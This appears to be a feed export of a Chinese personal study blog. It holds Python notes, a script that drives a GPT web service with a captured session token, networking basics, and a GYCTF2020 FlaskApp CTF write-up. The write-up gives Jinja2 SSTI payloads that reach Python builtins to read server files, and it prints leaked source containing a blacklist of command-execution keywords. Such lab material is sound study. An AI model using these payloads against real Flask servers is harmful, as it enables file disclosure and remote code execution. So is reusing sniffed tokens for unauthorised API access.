align="left">返回集合的交集。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-isdisjoint.html">isdisjoint()</a></td><td align="left">判断两个集合是否包含相同的元素，如果没有返回 True，否则返回 False。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issubset.html">issubset()</a></td><td align="left">判断指定集合是否为该方法参数集合的子集。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issuperset.html">issuperset()</a></td><td align="left">判断该方法的参数集合是否为指定集合的子集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-pop.html">pop()</a></td><td align="left">随机移除元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-remove.html">remove()</a></td><td align="left">移除指定元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference.html">symmetric_difference()</a></td><td align="left">返回两个集合中不重复的元素集合。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference_update.html">symmetric_difference_update()</a></td><td align="left">移除当前集合中在另外一个指定集合相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-union.html">union()</a></td><td align="left">返回两个集合的并集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-update.html">update()</a></td><td align="left">给集合添加元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-string-len.html">len()</a></td><td align="left">计算集合元素个数</td></tr></tbody></table><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>基本结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>() :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line"></span><br><span class="line">hello()</span><br></pre></td></tr></table></figure><h1 id="随便写的一个python程序"><a href="#随便写的一个python程序" class="headerlink" title="随便写的一个python程序"></a>随便写的一个python程序</h1><p>抓包某gpt并在终端问答</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sys.stdout.encoding)</span><br><span class="line"><span class="comment">###########第一次运行后把生成的topicId粘贴在此################################</span></span><br><span class="line">topicId = <span class="number">0</span>     <span class="comment">######################</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line">host = <span class="string">&quot;api.xiabb.chat&quot;</span></span><br><span class="line">UA = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################抓包并填写自己的Authorization##############</span></span><br><span class="line">Authorization = <span class="string">&quot;example&quot;</span></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendMessage</span>():</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/message&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: host,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: UA,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: Authorization,</span><br><span class="line">        <span class="string">&quot;Language&quot;</span>: <span class="string">&quot;zh-CN&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    msg = <span class="built_in">input</span>(<span class="string">&#x27;msg:&#x27;</span>)</span><br><span class="line">    data = &#123;<span class="string">&quot;topicId&quot;</span>:topicId,</span><br><span class="line">            <span class="string">&quot;messages&quot;</span>:[],</span><br><span class="line">            <span class="string">&quot;content&quot;</span>:msg,</span><br><span class="line">            <span class="string">&quot;contentFiles&quot;</span>:[]</span><br><span class="line">            &#125;</span><br><span class="line">    res = requests.post(url=url, json=data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        json_res = res.json()</span><br><span class="line">        messageRes = json_res.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(messageRes)</span><br><span class="line">        messageId = messageRes[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(messageId)</span><br><span class="line">        <span class="comment"># options</span></span><br><span class="line">        url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/message/&quot;</span> + <span class="built_in">str</span>(messageId)</span><br><span class="line">        opts_headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Request-Method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Request-Headers&quot;</span>: <span class="string">&quot;authorization,content-type&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        opts_res = requests.options(url=url,headers=opts_headers)</span><br><span class="line">        msg_res = requests.post(url,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(msg_res.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;something error in sending messge&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newTopic</span>():</span><br><span class="line">    url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/save&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: host,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: UA,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: Authorization,</span><br><span class="line">        <span class="string">&quot;Language&quot;</span>: <span class="string">&quot;zh-CN&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;roleId&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;title&quot;</span>:<span class="string">&quot;你好&quot;</span>,</span><br><span class="line">        <span class="string">&quot;isLock&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;systemMessage&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;params&quot;</span>:<span class="string">&quot;&#123;\&quot;model\&quot;:\&quot;gpt-3.5-turbo-16k-0613\&quot;,\&quot;is_webSearch\&quot;:false,\&quot;message\&quot;:[],\&quot;systemMessage\&quot;:null,\&quot;requestMsgCount\&quot;:6,\&quot;temperature\&quot;:0.8,\&quot;max_tokens\&quot;:8192&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(headers=headers,url=url,json=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        json_res = res.json()</span><br><span class="line">        result = json_res.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;it works!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> topicId:</span><br><span class="line">    topicId = newTopic()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;topicId:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(topicId)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;topicId exist&quot;</span>)</span><br><span class="line">sendMessage()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;python基础&quot;&gt;&lt;a href=&quot;#python基础&quot; class=&quot;headerlink&quot; title=&quot;python基础&quot;&gt;&lt;/a&gt;python基础&lt;/h1&gt;&lt;p&gt;之间也学过一些python编程基础,但大都是零散碎片化的知识&lt;/p&gt;
&lt;p&gt;故在此系统地记录</summary>
      
    
    
    
    <category term="笔记2" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B02/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>网络基础</title>
    <link href="http://example.com/2024/01/29/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/01/29/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</id>
    <published>2024-01-29T02:18:30.000Z</published>
    <updated>2024-01-29T15:34:01.405Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础"></a>网络基础</h1><h2 id="网络层级结构"><a href="#网络层级结构" class="headerlink" title="网络层级结构"></a>网络层级结构</h2><p>首先就是网络分层了,先上图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/OSI%E4%B8%8ETCP.webp"></p><p>一般都是按照tcp&#x2F;ip分层来实现网络分层, 也就是 物数网传应 五层模型</p><blockquote><ol><li>应用层</li></ol><p>应用层是我们经常接触使用的部分，比如常用的http协议、ftp协议（文件传输协议）、snmp（网络管理协议）、telnet （远程登录协议 ）、smtp（简单邮件传输协议）、dns（域名解析），这次主要是面向用户的交互的。这里的应用层集成了osi分层模型中 的应用、会话、表示层三层的功能。</p><ol start="2"><li>传输层</li></ol><p>传输层的作用就是将应用层的数据进行传输转运。比如我们常说的tcp（可靠的传输控制协议）、udp（用户数据报协议）。传输单位为报文段。<br>tcp（Transmission Control Protocol） 面向连接（先要和对方确定连接、传输结束需要断开连接，类似打电话）、复杂可靠的、有很好的重传和查错机制。</p><p>一般用与高速、可靠的通信服务udp（user datagram protocol）面向无连接（无需确认对方是否存在，类似寄包裹）、简单高效、没有重传机制。一般用于即时通讯、广播通信等。</p><ol start="3"><li>网络层</li></ol><p>来处理网络中流动的数据包，数据包为最小的传递单位，比如我们常用的ip协议、icmp协议、arp协议（通过分析ip地址得出物理mac地址）。</p><ol start="4"><li>数据链路层</li></ol><p>数据链路层一般用来处理连接硬件的部分，包括控制网卡、硬件相关的设备驱动等。传输单位数据帧。</p><ol start="5"><li>物理层</li></ol><p>物理层一般为负责数据传输的硬件，比如我们了解的双绞线电缆、无线、光纤等。比特流光电等信号发送接收数据。</p></blockquote><p>简而言之, 自顶向下来理解</p><p>__应用层__实现了具体的功能,如 收发邮件, 文件传输等, 对于如何传输, 并不关心</p><p>https, http, ftp, dns…</p><p>__传输层__则实现了如何传输, 如何将庞大的数据分块, 使其能够完整传输出去, 当某一块数据丢失使, 判断是否要对丢失的数据段重传</p><p>tcp, udp…</p><p>__网络层__则是负责数据如何从一端到另一端, 即我们常见的ip协议寻址, 他也会将传输层的数据段分块, 并在每一块前面加上ip包头, 形成ip报文(实际上每一层都会分块并加上自己的包头)</p><p>__数据链路层__并不关心以上任何东西, 他要做的只是实现数据点到点的传输, 例如,从a地到z地, 需要经过b,c,d,e,f… 两点之间如何传输就是在数据链路层上实现的. 工作在此此层级的协议MAC协议,同意会将ip报文分片并加上MAC头部形成MAC帧</p><p><strong>物理层</strong>,显而易见,通过将数据转换为光信号或电信号传输出去</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="一些请求方法"><a href="#一些请求方法" class="headerlink" title="一些请求方法"></a>一些请求方法</h3><p>GET, POST, HEAD, OPTIONS, PUT…</p><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><table><thead><tr><th align="left">分类</th><th align="left">分类描述</th></tr></thead><tbody><tr><td align="left">1**</td><td align="left">信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td align="left">2**</td><td align="left">成功，操作被成功接收并处理</td></tr><tr><td align="left">3**</td><td align="left">重定向，需要进一步的操作以完成请求</td></tr><tr><td align="left">4**</td><td align="left">客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td align="left">5**</td><td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><h3 id="HTTP-Cookie"><a href="#HTTP-Cookie" class="headerlink" title="HTTP Cookie"></a>HTTP Cookie</h3><blockquote><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据。浏览器会存储 cookie 并在下次向同一服务器再发起请求时携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器——如保持用户的登录状态。Cookie 使基于<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_%E6%98%AF%E6%97%A0%E7%8A%B6%E6%80%81%EF%BC%8C%E6%9C%89%E4%BC%9A%E8%AF%9D%E7%9A%84">无状态</a>的 HTTP 协议记录稳定的状态信息成为了可能。</p></blockquote><p>服务器向用户发送cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</span><br></pre></td></tr></table></figure><p>用户携带cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: xxxxxx=xxxxxx</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网络基础&quot;&gt;&lt;a href=&quot;#网络基础&quot; class=&quot;headerlink&quot; title=&quot;网络基础&quot;&gt;&lt;/a&gt;网络基础&lt;/h1&gt;&lt;h2 id=&quot;网络层级结构&quot;&gt;&lt;a href=&quot;#网络层级结构&quot; class=&quot;headerlink&quot; title=&quot;网络层级结</summary>
      
    
    
    
    <category term="笔记2" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B02/"/>
    
    
    <category term="网络基础" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <link href="http://example.com/2024/01/28/GYCTF2020-FlaskApp/"/>
    <id>http://example.com/2024/01/28/GYCTF2020-FlaskApp/</id>
    <published>2024-01-28T12:23:09.000Z</published>
    <updated>2024-01-29T14:57:35.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>在解密的页面输入任意几个字母(非base64码),会发现报错,泄露部分源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line"></span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line"></span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure><p>可以看见tmp里将用户输入的内容base64解码后直接嵌入了进去</p><p>有理由怀疑ssti</p><p>尝试一下</p><p>我们输入<code>e3sxMTExfX0=</code>(也就是1111编码后的结果)</p><p>会返回一个<code>1111</code>,果然是ssti</p><p>这里浅尝试了一下,发现不能直接回显出来_<em>subclass</em>_()的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&#x27;&#x27;.__class__.__base__.__subclasses__())%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__bases__[0].__subclasses__() %&#125;&#123;% print(i) %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>这两条都是没有回显的</p><p>看大佬的做法是嵌套一层if来找到catch_warnings,然后构造读取app.py</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;, &#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><p>读到的代码手动fomat一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for </span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm </span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField </span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired </span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap </span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span> </span><br><span class="line">bootstrap = Bootstrap(app) </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>): </span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64 Æ&#x27;</span>,validators= [DataRequired()]) </span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Ð¤&#x27;</span>) </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>): </span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64ãÆ&#x27;</span>,validators= [DataRequired()]) </span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Ð¤&#x27;</span>) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>): </span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list : </span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() : </span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>(): </span><br><span class="line">    txt = <span class="string">&quot;1%CKÍ&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>,txt = txt) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(): </span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) : </span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>) </span><br><span class="line">        text_decode = base64.b64encode(text.encode()) </span><br><span class="line">        tmp = <span class="string">&quot;Ó :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode())) </span><br><span class="line">        res = render_template_string(tmp) </span><br><span class="line">        flash(tmp) </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>)) </span><br><span class="line">    <span class="keyword">else</span> : </span><br><span class="line">        text = <span class="string">&quot;&quot;</span> </span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form ,method = <span class="string">&quot; Æ&quot;</span> ,img = <span class="string">&quot;flask.png&quot;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(): </span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) : </span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>) </span><br><span class="line">        text_decode = base64.b64decode(text.encode()) </span><br><span class="line">        tmp = <span class="string">&quot;Ó  &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode()) </span><br><span class="line">        <span class="keyword">if</span> waf(tmp) : </span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>) </span><br><span class="line">            